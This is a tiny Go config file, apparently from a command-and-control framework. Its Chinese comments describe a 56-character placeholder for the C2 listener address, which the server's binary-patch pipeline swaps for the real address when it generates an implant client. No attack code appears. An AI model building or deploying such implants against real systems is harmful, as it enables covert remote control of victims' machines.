package config

// Host 是 C2 监听器地址占位符（固定 56 字符）。
// 客户端生成时由服务端二进制 patch 管线替换为真实地址（见 pkg/api/server.go / pkg/delivery/payload.go）。
// 各 adapter 读取 config.Host 作为连接目标，避免每个 adapter 各自硬编码占位符。
var Host = "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" // 56字符占位符，与服务端 GenServer patch 一致
